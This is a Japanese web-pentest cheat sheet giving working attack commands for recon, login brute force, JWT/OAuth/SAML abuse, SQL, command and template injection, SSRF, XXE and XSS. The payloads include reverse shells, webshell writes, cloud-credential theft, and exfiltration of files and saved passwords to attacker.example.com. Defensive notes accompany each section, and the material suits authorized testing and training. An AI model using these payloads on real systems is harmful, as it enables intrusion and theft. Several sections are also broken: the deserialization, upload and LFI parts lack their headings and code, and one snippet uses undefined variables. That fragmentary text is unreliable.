01Recon & Mapping偵察・マッピング

攻撃対象の技術スタック特定、コンテンツ探索、パラメータ発見。reconnaissance sheet のネットワーク偵察に対し、ここは HTTP レイヤの列挙に特化する。

技術スタック特定

bash
# ヘッダ / 技術指紋
whatweb -a 3 https://target.example.com
curl -sI https://target.example.com
nuclei -u https://target.example.com -t http/technologies/

# WAF 検出
wafw00f https://target.example.com

コンテンツ探索 (ディレクトリ / ファイル)

bash
# ffuf — ディレクトリ / ファイル探索
ffuf -u https://target.example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,307,401,403
ffuf -u https://target.example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.bak,.old,.txt,.zip

# 再帰探索 + フィルタ
ffuf -u https://target.example.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2 -fc 404 -fs 0

# feroxbuster (自動再帰)
feroxbuster -u https://target.example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt

vhost / サブドメイン列挙

bash
# vhost fuzzing (Host ヘッダ)
ffuf -u https://target.example.com -H "Host: FUZZ.target.example.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0

# サブドメイン列挙
subfinder -d target.example.com -silent | httpx -silent -title -tech-detect

パラメータ発見

bash
# arjun — 隠れた HTTP パラメータ発見
arjun -u "https://target.example.com/api/endpoint" -m GET
arjun -u "https://target.example.com/api/endpoint" -m POST

# paramspider — アーカイブからパラメータ収集
paramspider -d target.example.com
Burp workflow Proxy → Target → Site map でクロール結果を可視化。Target → Scope に対象を追加し "Show only in-scope items" で絞る。Engagement tools → Discover content でコンテンツ探索、Analyze target で攻撃面把握。Burp の passive scan を有効化しつつ手動でサイトを巡回すると、technology fingerprint と潜在的な脆弱パラメータが自動収集される。
防御 / countermeasures
  • Server / X-Powered-By / X-AspNet-Version 等の technology-disclosure ヘッダを削除
  • ディレクトリリスティングを無効化、機密ファイル (.git / .env / backup) を web root 外へ
  • WAF (ModSecurity + OWASP CRS) で discovery scan の高頻度リクエストを rate-limit
  • 不要なエンドポイント / デバッグインターフェースを本番から除去
要点 / key takeaways
  • recon は「技術特定 → コンテンツ探索 → パラメータ発見」の順で攻撃面を段階的に展開
  • ffuf の filter (-fc / -fs / -fw) と matcher (-mc) を使い分け、レスポンスサイズ / ステータスで noise を除去
  • vhost fuzzing は同一 IP 上の非公開アプリを発見する、DNS 列挙と補完関係
  • Burp Target scope の設定は誤爆防止と後続の全ツール連携の起点

02Authentication認証

ログイン機構・トークン・SSO の設計不備を突く。JWT / OAuth / SAML は現代 Web アプリの認証中核で、それぞれ固有の攻撃面を持つ。

ログイン攻撃 (bruteforce / user enum)

bash
# ffuf — POST ログインブルートフォース
ffuf -u https://target.example.com/login -X POST \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/seclists/Passwords/rockyou.txt \
  -fr "Invalid credentials"

# hydra — HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.example.com \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# ユーザ列挙 (レスポンス差分 / タイミング)
ffuf -u https://target.example.com/login -X POST \
  -d "username=FUZZ&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -fr "Invalid username"

JWT 攻撃

bash
# jwt_tool — 解析 + 脆弱性スキャン
jwt_tool eyJhbGci...
jwt_tool eyJhbGci... -M pb            # playbook スキャン

# alg:none 改竄
jwt_tool eyJhbGci... -X a

# HS256 鍵ブルートフォース (弱い secret)
jwt_tool eyJhbGci... -C -d /usr/share/wordlists/rockyou.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# RS256 → HS256 confusion (公開鍵を HMAC 鍵に転用)
jwt_tool eyJhbGci... -X k -pk public.pem

# kid injection (SQLi / path traversal / command)
jwt_tool eyJhbGci... -I -hc kid -hv "../../dev/null"
JWT 攻撃の判断順序
  • alg:none — 署名検証がアルゴリズム名を信頼している場合に成立
  • weak HMAC secret — HS256 で辞書に載る secret を使用している場合
  • alg confusion (RS256→HS256) — 検証側が公開鍵を HMAC secret として扱う実装ミス
  • kid injection — kid ヘッダがファイル読込 / SQL クエリに渡される場合
  • jku / x5u SSRF — 鍵取得 URL を攻撃者サーバに向ける

OAuth 2.0 / OIDC

http
# redirect_uri 検証不備 — 認可コード奪取
GET /authorize?client_id=xxx&redirect_uri=https://attacker.example.com&response_type=code&scope=openid HTTP/1.1

# redirect_uri の path traversal / サブドメイン許容の悪用
redirect_uri=https://target.example.com.attacker.example.com
redirect_uri=https://target.example.com/callback/../redirect?url=attacker

# state パラメータ欠如 → CSRF (アカウント連携の乗っ取り)
# response_type=token (implicit) のトークン漏洩

SAML

bash
# SAMLResponse の解析 / 改竄 (Burp SAML Raider 拡張が主軸)
echo "SAMLResponse..." | base64 -d | xmllint --format -

# XML Signature Wrapping (XSW) — 署名済み要素の外に改竄要素を注入
# signature exclusion — Signature 要素ごと削除して検証回避
# comment injection — user@example.com.attacker.example.com で NameID を分断
Burp workflow 認証系は Burp が主戦場。JWT は JWT Editor 拡張で alg 改竄・鍵注入をリアルタイムに。SAML は SAML Raider で XSW / signature exclusion を GUI 操作。OAuth の redirect_uri テストは Repeater で response_type / redirect_uri を差し替え、Intruder でパラメータ pollution を総当たり。ログインブルートフォースは Intruder (Sniper / Cluster bomb) だが、無料版はレート制限があるため CLI ツール併用が現実的。
防御 / countermeasures
  • JWT は署名アルゴリズムをサーバ側で固定 (alg ヘッダを信頼しない)、HS256 secret は 256bit 以上のランダム値
  • OAuth の redirect_uri は完全一致 (exact match) で検証、state パラメータを必須化
  • SAML は署名検証を XML 全体に適用、XSW 対策として署名対象要素を厳格に参照
  • ログイン試行のレート制限 + アカウントロックアウト、ユーザ列挙防止のため成功/失敗レスポンスを一定化
  • 多要素認証 (MFA) の導入、セッショントークンの再生成 (ログイン時 fixation 対策)
要点 / key takeaways
  • JWT は alg:none → weak secret → alg confusion → kid injection の順で試すのが効率的
  • OAuth の脆弱性は redirect_uri 検証不備と state 欠如が二大経路、アカウント乗っ取りに直結
  • SAML は XSW が中核、SAML Raider なしでの手動改竄は非効率
  • 認証系は Burp 拡張 (JWT Editor / SAML Raider) の習熟が実務効率を大きく左右する

03Access Controlアクセス制御

認証済みユーザが権限外のリソース / 機能にアクセスできる不備。IDOR と権限昇格が中核で、水平 (他ユーザのデータ) と垂直 (上位権限機能) の両方向を検証する。

IDOR (Insecure Direct Object Reference)

bash
# 数値 ID の総当たり (他ユーザリソースへの水平アクセス)
ffuf -u "https://target.example.com/api/user/FUZZ/profile" \
  -H "Authorization: Bearer <TOKEN>" \
  -w <(seq 1 10000) -mc 200 -fr "Access denied"

# UUID / ハッシュ ID の漏洩元探索 (他エンドポイントからの ID 収集)
# 予測可能な ID (base64 / MD5 / 連番) のデコード
echo "MTAwMQ==" | base64 -d    # → 1001

権限昇格 (垂直)

http
# 管理者機能への forced browsing
GET /admin/deleteUser?id=5 HTTP/1.1

# パラメータベースの権限操作 (mass assignment)
POST /api/user/update HTTP/1.1
{"username":"attacker","role":"admin","isAdmin":true}

# HTTP メソッド切替 (GET 制限を PUT / DELETE で回避)
# X-Original-URL / X-Rewrite-URL によるパス制限回避
GET /index HTTP/1.1
X-Original-URL: /admin/config
Burp workflow アクセス制御は Autorize 拡張が決定版。低権限ユーザの Cookie / トークンを Autorize に登録し、高権限セッションで巡回すると、各リクエストを低権限で再送して "Bypassed! / Enforced!" を自動判定する。IDOR は Repeater で ID を差し替えつつ、Intruder (Sniper) で連番 / UUID リストを総当たり。Match and Replace ルールでセッショントークンを常時差し替える運用も有効。
防御 / countermeasures
  • オブジェクトアクセスごとに所有者検証 (session user == resource owner) をサーバ側で強制
  • 直接参照を避け、セッションに紐づく間接参照 (indirect reference map) を使用
  • 権限チェックを deny-by-default で実装、機能単位で明示的に許可
  • mass assignment 対策として、受入フィールドを allowlist で限定 (role / isAdmin を bind しない)
  • X-Original-URL / X-Rewrite-URL 等のヘッダを信頼しない、URL 正規化を統一
要点 / key takeaways
  • IDOR は水平 (他ユーザデータ) と垂直 (上位権限) の両方向を検証、ID の予測可能性が鍵
  • mass assignment は role / isAdmin 等の特権フィールドを JSON に注入して検証
  • Autorize 拡張は 2 セッション比較でアクセス制御不備を半自動検出、実務効率が高い
  • ヘッダベースのパス制限回避 (X-Original-URL) は逆プロキシ構成で頻出

04Injectionインジェクション

ユーザ入力がインタプリタ (SQL / OS shell / テンプレートエンジン / LDAP) にコンテキスト分離なく渡る不備。攻撃面が広く、web アプリ侵害の最頻経路。

SQL Injection

UNION-based の基本手順
  • (1) 脆弱性確認 — 単一引用符 ' でエラー誘発
  • (2) カラム数特定 — ORDER BY N を増やしてエラー境界を探る、または UNION SELECT NULL,NULL,...
  • (3) DB 名特定 — database() / @@version で DBMS と DB を確認
  • (4) テーブル / カラム列挙 — information_schema.tables / information_schema.columns
  • (5) データ抽出 — 対象テーブルから認証情報等を取得
bash
# 手動検出 — エラーベース / boolean / time-based
' OR '1'='1
' UNION SELECT NULL,NULL,NULL-- -
'; WAITFOR DELAY '0:0:5'-- -            # MSSQL time-based
' AND SLEEP(5)-- -                      # MySQL time-based

# sqlmap — 自動化
sqlmap -u "https://target.example.com/item?id=1" --batch --dbs
sqlmap -r request.txt --batch --level 5 --risk 3 --dbs      # Burp 保存リクエストから
sqlmap -u "..." --dbms=mysql -D appdb -T users --dump

# WAF 回避 tamper
sqlmap -u "..." --tamper=space2comment,between,charencode --random-agent

# 権限がある場合の発展 (RCE / ファイル操作)
sqlmap -u "..." --os-shell                             # インタラクティブ OS shell (要 stacked query / FILE 権限)
sqlmap -u "..." --file-write local.txt --file-dest "/var/www/html/shell.php"
sqlmap -u "..." --file-read "/etc/passwd"
sql
-- UNION-based データ抽出 (カラム数特定後)
' UNION SELECT username,password FROM users-- -

-- DB 種別特定
' UNION SELECT @@version,NULL-- -          # MySQL/MSSQL
' UNION SELECT version(),NULL-- -          # PostgreSQL
' UNION SELECT banner,NULL FROM v$version-- -   # Oracle

-- テーブル / カラム列挙 (information_schema)
' UNION SELECT table_name,NULL FROM information_schema.tables-- -
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT table_name,column_name FROM information_schema.columns-- -

-- RCE (権限次第)
'; EXEC xp_cmdshell 'whoami'-- -           # MSSQL
' INTO OUTFILE '/var/www/html/shell.php'-- -    # MySQL file write
文字列 / 関数コンテキストの脱出
  • クエリが LOWER(name)='input' のように関数で包む場合、文字列だけでなく関数の閉じ括弧 ) も補う: foo') OR id=11-- -
  • LIKE '%input%' の場合は末尾の %') も閉じる: %foo') OR id=11-- %
  • ORDER BY N を増やしてエラー境界からカラム数を特定 (UNION の前段)
  • 大小文字を区別する DB では UPPER()/LOWER() でフィルタ回避も併用
sql
-- DBMS 別の列挙 (current_user / データベース一覧)
-- MySQL / MariaDB
SELECT current_user();  SELECT table_schema FROM information_schema.tables GROUP BY table_schema;
SELECT table_name FROM information_schema.tables WHERE table_schema='appdb';

-- MSSQL
SELECT SYSTEM_USER;  SELECT name FROM sys.databases;
SELECT * FROM appdb.information_schema.tables;

-- PostgreSQL
SELECT current_user;  SELECT datname FROM pg_database;
SELECT table_name FROM appdb.information_schema.tables WHERE table_schema='public';

-- Oracle (DUAL / all_tables、スキーマ = ユーザ)
SELECT user FROM dual;  SELECT owner FROM all_tables GROUP BY owner;
SELECT table_name FROM all_tables WHERE owner='SYSTEM';
sql
-- ファイル読み書き (DBMS 別)
-- MySQL: secure_file_priv が許可パスを制限
SELECT @@GLOBAL.secure_file_priv;
SELECT LOAD_FILE('/etc/passwd');
SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/out.txt';

-- PostgreSQL: COPY / pg_read_file()
CREATE TABLE tmp(data text); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;
SELECT pg_read_file('/etc/passwd');
COPY tmp TO '/var/www/html/shell.php';    # webshell 書込

-- MSSQL: xp_cmdshell 有効化 → RCE
EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
エラーベース抽出のヒント
  • MySQL: extractvalue('',concat('>',version())) / cast(version() as int)
  • MSSQL / PostgreSQL: cast(@@version as int) / cast(version() as int) の型変換エラーに値を載せる
  • Oracle: dbms_xmlgen.getxml()、Oracle/PostgreSQL は || で文字列連結
  • スタッククエリ (; 区切り) は PostgreSQL 等で INSERT/UPDATE を注入可能

Command Injection

bash
# 区切り文字での連結
; id
| id
|| id
&& id
$(id)
`id`

# OOB / blind (時間 / DNS)
; sleep 10
& nslookup $(whoami).attacker.example.com

# フィルタ回避
;i''d
;i\d
;cat${IFS}/etc/passwd    # スペースフィルタ回避
;wh$()oami               # 空の command substitution で blocklist 文字列を分断
;n$()c -nvlp 4444
正規化・sanitize の突破
  • URL 内の & は別パラメータと解釈される。bash -c '...' でラップして 1 パラメータに収める
  • blocklist は「指令」でなく「文字列」を弾く。wh$()oami のように shell では解釈されるが filter には別文字列に見える形で分断
  • 危険文字列 (etc / passwd / バッククォート) は base64 で回避: ;`echo Y2F0IC9ldGMvcGFzc3dk|base64 -d`
  • base64 バイナリが無ければ openssl で代替: echo ... | openssl base64 -d (ほぼ全 Linux に存在)
bash
# reverse shell 取得 (言語別、注入先の実行環境に合わせる)
# bash
bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
# python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<LHOST>",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
# php
php -r '$s=fsockopen("<LHOST>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
# perl
perl -e 'use Socket;$i="<LHOST>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
# node.js
require('child_process').spawnSync('/bin/sh',['-c','bash -i >& /dev/tcp/<LHOST>/4444 0>&1'])

SSTI (Server-Side Template Injection)

bash
# 検出 polyglot
${{<%[%'"}}%\.

# エンジン判定 (数式評価)
{{7*7}}       # Jinja2/Twig → 49
${7*7}        # Freemarker/Spring → 49
<%= 7*7 %>     # ERB → 49
#{7*7}        # Pug/Ruby/Thymeleaf → 49
エンジン / 言語の判別 数式が評価されたら、次に文字列演算で背後の言語を切り分ける。
  • {{7*'7'}} → 49 なら PHP (Twig)、7777777 なら Python (Jinja) — 弱い型付けか文字列反復かで判別
  • ${7*'7'} → エラーなら Java (Freemarker、自動型変換なし)
  • #{7*7} が HTML タグに包まれて <49> になる → Pug (JS、行頭がタグ)
  • Twig 固有の whitespace control -{% %}- が効くか
python
# Jinja2 (Python) — RCE
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Freemarker (Java) — Execute クラスを ?new() で実体化
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
php
# Twig (PHP) — filter が文字列の PHP 関数名を callback として受ける
{{ [0]|reduce('system','id') }}       # array_reduce([0],'system','id')
{{ ['id']|map('system') }}            # array_map('system',['id'])
{{ ['id']|filter('system') }}         # array_filter(['id'],'system')
# 高リスク filter: reduce / map / filter / sort / column
javascript
# Pug (Node.js) — sandbox に require が無くても process 経由で取得
- var require = global.process.mainModule.require
= require('child_process').spawnSync('id').stdout

# Handlebars — #with helper 経由で関数コンストラクタに到達し RCE
# (Mustache は純粋な logic-less で gadget 無し = RCE 不可)
{{#with "s" as |str|}}{{#with str.split as |c|}}...(constructor 経由で require)...{{/with}}{{/with}}
# {{7*7}} が評価されない (logic-less) 点で SSTI エンジンから両者を切り分け

# tplmap — 自動化
# tplmap -u "https://target.example.com/page?name=test"
Burp workflow Injection 系は Repeater で手動 payload を試し、Intruder で payload リストを総当たりが基本。SQLi は Burp で脆弱リクエストを保存 (右クリック → Save item) し、sqlmap -r に渡す連携が効率的。ActiveScan++ 拡張で out-of-band 検出を強化、Collaborator で blind / OOB (SQLi time-based, command injection DNS) を確認。Hackvertor でエンコーディングチェーンを組み、WAF 回避 payload を動的生成。
防御 / countermeasures
  • SQLi: パラメータ化クエリ (prepared statement) を全 DB アクセスで強制、ORM の raw query を排除
  • NoSQLi: 入力を文字列型に強制キャスト、operator ($ne / $regex 等) を含む JSON を拒否
  • Command injection: OS コマンド呼出を避け、言語ネイティブ API を使用、避けられない場合は引数を allowlist 化
  • SSTI: ユーザ入力をテンプレートに連結しない、logic-less テンプレート (Mustache) を使用、サンドボックス化
  • 全般: WAF + 入力バリデーション (allowlist) + 最小権限 DB アカウント
要点 / key takeaways
  • SQLi は手動で DB 種別を特定してから sqlmap で自動化、tamper で WAF 回避
  • DBMS ごとに列挙構文が異なる (MSSQL sys.databases / Oracle all_tables+DUAL / PostgreSQL pg_database)
  • ファイル R/W は権限依存: MySQL LOAD_FILE/OUTFILE+secure_file_priv、PostgreSQL COPY/pg_read_file、MSSQL xp_cmdshell で RCE
  • 関数で包まれた入力は文字列と関数の閉じ括弧の両方を補って脱出する
  • NoSQLi は operator injection ($ne / $regex) が中核、認証バイパスとブラインド抽出の両用途
  • Command injection は blind (時間 / DNS OOB) の検出手段を持つことが重要
  • cmdi のフィルタ回避は $() 分断 / base64・openssl / bash -c ラップ、shell 取得は注入先の言語に合わせる
  • SSTI は {{7*7}} でエンジン判定 → {{7*'7'}} で言語判別 (PHP=49 / Python=7777777) → エンジン固有 gadget
  • SSTI の RCE 経路: Jinja=__mro__ / Twig=filter callback / Freemarker=?new() / Pug=process.mainModule.require

信頼できないデータのデシリアライズにより、オブジェクト生成過程で任意コード実行に至る脆弱性。言語ごとに gadget chain の選定が攻撃成否を分ける。

Java

  • Node.js は node-serialize の unserialize() が IIFE を評価する構造を突く、Cookie 経由が典型
  • ViewState は MAC 無効 or 鍵漏洩が前提、machineKey 漏洩は致命的
  • gadget が不明でも URLDNS / DNS OOB で「脆弱性の存在」を先に立証できる

Burp workflow アップロードは Repeater で Content-Type / ファイル名 / マジックバイトを個別に改変して検証。Intruder でファイル名の拡張子リスト (seclists/Web-Shells や拡張子 payload) を総当たり。Path traversal は Intruder で traversal payload リストを流し、レスポンス長 / root: 文字列でヒット判定。Hackvertor で多重エンコーディングを動的生成。
防御 / countermeasures
  • アップロードファイルの拡張子を allowlist で検証、MIME とマジックバイトの両方をチェック
  • アップロード先を web root 外に配置、実行権限を剥奪、ランダムファイル名にリネーム
  • パス操作でユーザ入力を使わない、canonicalize 後に basedir 制約を検証
  • PHP: allow_url_include / allow_url_fopen を無効化、危険な wrapper を制限
  • WAF で traversal シーケンス (../ / エンコード変種) を検出・遮断
要点 / key takeaways
  • アップロードは拡張子 / Content-Type / マジックバイト / .htaccess の複合バイパスを試す
  • LFI は php:// filter wrapper でソース漏洩、data:// / expect:// で RCE に発展
  • LFI → RCE は Log Poisoning (User-Agent/ログ) と PHP Session Poisoning (session ファイル) が定番、パス特定は phpinfo が近道
  • RFI は allow_url_include=On が前提、攻撃者サーバのコードを直接取り込む
  • traversal フィルタは多重エンコード / 除去型回避 (....//) で突破

07SSRF & XXESSRF・XXE

サーバにリクエストを強制する SSRF と、XML パーサの外部エンティティ処理を悪用する XXE。いずれも内部ネットワーク / クラウドメタデータへの到達が主目的。

SSRF (Server-Side Request Forgery)

bash
# クラウドメタデータ (認証情報奪取)
http://169.254.169.254/latest/meta-data/iam/security-credentials/    # AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
http://metadata.google.internal/computeMetadata/v1/    # GCP (要 Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance?api-version=2021-02-01    # Azure

# 内部ポートスキャン / サービス到達
http://127.0.0.1:6379/    # Redis
http://127.0.0.1:8080/admin

# フィルタ回避 (127.0.0.1 ブロック時)
http://127.1/
http://0177.0.0.1/          # 8 進
http://2130706433/          # 10 進
http://localhost.attacker.example.com/    # DNS rebinding
http://[::1]/               # IPv6
クラウドメタデータの差異
  • AWS — IMDSv1 は GET /latest/meta-data/iam/security-credentials/<ROLE> で AccessKeyId/SecretAccessKey/SessionToken を奪取。IMDSv2 は PUT /latest/api/token (ヘッダ X-aws-ec2-metadata-token-ttl-seconds) でトークン取得が先行必要
  • GCP — metadata.google.internal/computeMetadata/v1/、ヘッダ Metadata-Flavor: Google 必須
  • Azure — 169.254.169.254/metadata/instance?api-version=...
  • 169.254.0.0/16 は Link-Local、外部ルーティングされず同一 NIC からのみ到達可能
scheme 判別で後端 client を推測 SSRF は http/https 以外の scheme で後端 HTTP client の種類を切り分ける。file:///etc/passwd が通れば curl / PHP (LFI に発展)、通らなければ Python requests (http/https のみ)。gopher:// が使えれば任意 TCP に拡張でき、改行注入で完全な HTTP リクエスト (POST 含む) や Redis / MySQL へのコマンド送信を偽造できる。gopher は selector で先頭 1 文字が切られる点と、ブラウザ→web app→SSRF の二段のため URL の二重エンコードが必要な点に注意。
microservice 認証バイパス (Session Riding 型) API Gateway / リバースプロキシで施す認証・JWT・ACL・IP allowlist は「外→内」の境界にのみ適用され、内部 microservice 間の通信には効かない。SSRF 可能な microservice A を踏み台にすると、内部ネットワーク身分で microservice B に直接リクエストでき、ゲートウェイの認証を回避して内部 API を叩ける。
bash
# ffuf と組み合わせた内部ポートスキャン
# SSRF 可能なパラメータ / ヘッダの FUZZ 位置にポート番号を流す
ffuf -u "https://target.example.com/fetch?url=http://127.0.0.1:FUZZ" \
  -w <(seq 0 65535) -ac

# プロキシ系ヘッダ経由の SSRF (実装依存のヘッダ名)
ffuf -u https://target.example.com -H "X-Forwarded-Host: 127.0.0.1:FUZZ" \
  -w <(seq 1 10000) -ac
bash
# Gopher — 任意 TCP パケット (Redis / SMTP へのコマンド注入)
gopher://127.0.0.1:6379/_SET%20key%20value
# Redis へ set / config set dir で webshell 書込に発展

XXE (XML External Entity)

xml
<!-- ファイル読込 -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- SSH 秘密鍵 / Windows ファイル -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/alice/.ssh/id_rsa">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>

<!-- 読込結果が空になる場合は php filter で base64 化 -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>

<!-- コマンド実行 (expect モジュール有効時) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>

<!-- SSRF (XXE 経由でメタデータ到達) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>

<!-- OOB 抽出 (blind XXE、外部 DTD) -->
<!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://attacker.example.com/evil.dtd"> %ext;]>
xml
<!-- evil.dtd (OOB 抽出用外部 DTD) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example.com/?x=%file;'>">
%eval;
%exfil;

XXE against JSON (Content-Type 切替)

JSON を受け付けるエンドポイントでも、XML パーサが背後にある場合は Content-Type を application/xml に変え、body を XML に書き換えることで XXE が成立しうる。JSON API だからと XXE を除外しない。

http
POST /api/endpoint HTTP/1.1
Host: target.example.com
Accept: application/json
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
Burp workflow SSRF / blind XXE はどちらも Collaborator が中核。Repeater で payload を送信し、Collaborator client で DNS / HTTP interaction を確認する。SSRF のフィルタ回避は Intruder で IP 表記変種 (8進/10進/IPv6) を総当たり。XXE は Content-Type を application/xml に変えつつ、JSON エンドポイントでも XML を受け付けるか Repeater で検証 (Content-Type 切替攻撃)。Collaborator Everywhere 拡張で全リクエストに OOB payload を自動注入。
防御 / countermeasures
  • SSRF: 送信先を allowlist で制限、内部 IP レンジ (169.254.x / 127.x / 10.x / 172.16.x / 192.168.x) を拒否
  • SSRF: DNS rebinding 対策として解決後 IP を再検証、リダイレクト追従を無効化
  • クラウド: IMDSv2 (トークン必須) に移行、メタデータエンドポイントへのアクセスを制限
  • XXE: XML パーサで外部エンティティ / DTD 処理を無効化 (FEATURE_SECURE_PROCESSING)
  • XXE: 可能なら XML を避け JSON を使用、XML 必須なら軽量パーサ設定を統一
要点 / key takeaways
  • SSRF の第一目標はクラウドメタデータ (169.254.169.254) の認証情報奪取
  • SSRF フィルタは IP 表記変種 (127.1 / 8進 / 10進 / IPv6) と DNS rebinding で回避
  • クラウド別に metadata の作法が違う (AWS IMDSv2 の token / GCP の Metadata-Flavor / Azure)
  • scheme (file/gopher) の可否で後端 client を推測、gopher は任意 TCP・内部 API 偽造に発展
  • SSRF は microservice 間通信のゲートウェイ認証バイパスにも使える
  • Gopher wrapper は SSRF を任意 TCP に拡張、Redis 経由の RCE に発展
  • blind XXE は外部 DTD による OOB 抽出、Collaborator で疎通と抽出を確認
  • JSON エンドポイントも Content-Type を application/xml に切替えれば XXE 対象になりうる

XSS 類型と検証
  • Reflected — 入力が同一レスポンスに即反映。URL パラメータ / 検索フォームが典型エントリポイント
  • Stored — 入力が保存され他ユーザに配信。コメント / プロフィール / ログ表示画面
  • DOM-based — サーバを経由せず JS が source→sink で処理。location.hash → innerHTML 等
  • Blind — 攻撃者が結果を直接見られない (管理画面 / サポート問合せ)。OOB コールバック (Collaborator / 自前サーバ) で発火を検知
javascript
// DOM XSS の source → sink
// source: location / location.hash / document.URL / document.referrer / postMessage
// sink:   innerHTML / outerHTML / insertAdjacentHTML / document.write / eval / setTimeout

// Blind XSS — 遅延実行環境で外部スクリプトを読み込む
<script src=https://attacker.example.com/x.js></script>
"><script src=https://attacker.example.com/x.js></script>

XSS Exploitation の発展 — XSS の価値は alert ではなく被害者ブラウザの権限で行動すること。長い payload は文字数制限を避けるため外部スクリプト読込に逃がすのが定石。以下は代表的な exploitation。

javascript

// Saved Password 窃取 — 偽の input を DOM 挿入し browser autofill を誘発

document.body.append(u); document.body.append(p);
setTimeout(function(){ fetch('https://attacker.example.com/?u='+u.value+'&p='+p.value) },5000);

// Phishing — ページ全体を書き換え、form action を攻撃者サーバへ
fetch('/login').then(r=>r.text()).then(d=>{
  document.documentElement.innerHTML=d;
  var f=document.getElementsByTagName('form')[0];
  f.action='https://attacker.example.com/'; f.method='get';
});
XSS-driven CSRF (Session Riding) HttpOnly で document.cookie が読めなくても、XSS から同一オリジンへ fetch() すればブラウザが自動で cookie を付与する。つまり cookie を盗まずとも、被害者セッションで状態変更リクエスト (パスワード変更 / 権限付与 / アドレス変更) を送れる。credentials:'same-origin' (または 'include' + mode:'no-cors') を指定して認証済みリクエストを発行する。CSRF トークンがあっても、XSS 経由なら DOM からトークンを読んで同送できるため防げない。

CSRF (Cross-Site Request Forgery)

html
<!-- トークン欠如時の自動送信フォーム -->
<form action="https://target.example.com/account/email" method="POST" id="c">
  <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>document.getElementById('c').submit()</script>

<!-- SameSite バイパス検証: GET 化 / サブドメイン / method override -->

Cross-Origin (SOP / SameSite / CORS)

3 つの境界の役割
  • Same-Origin Policy (SOP) — origin = scheme + host + port。JS が別 origin のレスポンスを読むことを禁止 (リクエスト送信自体は許可)。画像 / iframe / script の埋込は SOP 例外
  • SameSite Cookie — cookie を送るかを制御。None=常送 / Lax(既定)=トップレベル GET のみ / Strict=同一サイトのみ。CSRF の成否を左右する
  • CORS — SOP を選択的に緩和。設定不備があれば攻撃者 origin にレスポンス読取を許してしまう
http
# CORS preflight (非単純リクエストで OPTIONS が先行)
OPTIONS /api/data HTTP/1.1
Host: target.example.com
Origin: https://attacker.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-Custom

# 危険なレスポンス — Origin 反射 + credentials 許可
Access-Control-Allow-Origin: https://attacker.example.com
Access-Control-Allow-Credentials: true
bash
# Origin 反射 + credentials 許可の検証
curl -s -I https://target.example.com/api/data -H "Origin: https://attacker.example.com"
# Access-Control-Allow-Origin が Origin をそのまま反射し
# Access-Control-Allow-Credentials: true なら情報奪取可能

# null origin / サブドメイン / 前方一致バイパスの検証
curl -s -I https://target.example.com/api/data -H "Origin: null"
curl -s -I https://target.example.com/api/data -H "Origin: https://target.example.com.attacker.example.com"
Burp workflow XSS は Repeater でコンテキスト (HTML body / 属性 / JS / URL) ごとに payload を試し、DOM Invader (Burp 内蔵ブラウザ) で DOM XSS の source→sink を自動追跡。反射 XSS は Intruder で XSS payload リストを流し、レスポンスに payload がエスケープされず出現するか判定。CORS は passive scan が Origin 反射を検出。CSRF PoC は Engagement tools → Generate CSRF PoC で自動生成できる。
防御 / countermeasures
  • XSS: 出力コンテキストに応じたエスケープ、CSP (script-src 'self' 等) を strict に設定
  • XSS: Cookie に HttpOnly / Secure を付与、DOM sink (innerHTML / eval) を排除
  • CSRF: 予測不能な CSRF トークンを検証、SameSite=Lax/Strict を設定
  • CORS: Origin を allowlist で厳格検証、credentials 許可時にワイルドカード / 反射を禁止
  • clickjacking: X-Frame-Options: DENY または CSP frame-ancestors 'none'
